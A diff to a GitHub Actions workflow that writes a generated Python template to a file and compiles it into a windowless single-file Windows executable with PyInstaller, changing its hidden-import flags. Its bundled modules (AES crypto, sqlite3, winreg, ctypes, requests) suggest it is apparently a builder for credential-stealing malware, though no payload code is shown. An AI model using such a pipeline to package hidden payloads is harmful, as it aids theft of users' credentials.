@@ -55,32 +55,16 @@ jobs:
           $filename = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}" } else { "benz0" }
           $template | Out-File -FilePath "${filename}.py" -Encoding utf8
 
-      - name: Build EXE with all hidden imports
+      - name: Build EXE with collect-all
         run: |
           $filename = if ("${{ github.event.inputs.file_name }}" -ne "") { "${{ github.event.inputs.file_name }}" } else { "benz0" }
           $icon_arg = if (Test-Path "icon.ico") { "--icon=icon.ico" } else { "" }
           pyinstaller --onefile --noconsole `
-            --hidden-import=Crypto `
-            --hidden-import=Crypto.Cipher `
-            --hidden-import=Crypto.Cipher.AES `
-            --hidden-import=Crypto.Util `
-            --hidden-import=Crypto.Protocol `
-            --hidden-import=Crypto.Hash `
-            --hidden-import=Crypto.Random `
+            --collect-all=Crypto `
+            --collect-all=urllib3 `
             --hidden-import=requests `
-            --hidden-import=urllib `
-            --hidden-import=urllib.request `
-            --hidden-import=urllib.parse `
-            --hidden-import=urllib.error `
-            --hidden-import=urllib3 `
-            --hidden-import=urllib3.util `
-            --hidden-import=urllib3.poolmanager `
-            --hidden-import=json `
             --hidden-import=sqlite3 `
-            --hidden-import=zipfile `
-            --hidden-import=shutil `
             --hidden-import=ctypes `
-            --hidden-import=ctypes.wintypes `
             --hidden-import=winreg `
             --hidden-import=threading `
             --hidden-import=subprocess `
@@ -91,7 +75,14 @@ jobs:
             --hidden-import=os `
             --hidden-import=sys `
             --hidden-import=base64 `
-            --hidden-import=logging `
+            --hidden-import=json `
+            --hidden-import=zipfile `
+            --hidden-import=shutil `
+            --hidden-import=urllib `
+            --hidden-import=urllib.request `
+            --hidden-import=urllib.parse `
+            --hidden-import=urllib.error `
+            --hidden-import=traceback `
             --hidden-import=tempfile `
             --hidden-import=glob `
             --hidden-import=struct `
@@ -102,7 +93,6 @@ jobs:
             --hidden-import=http.client `
             --hidden-import=io `
             --hidden-import=binascii `
-            --hidden-import=traceback `
             $icon_arg `
             "${filename}.py"
           $exe_name = "${{ github.event.inputs.file_name }}.exe"
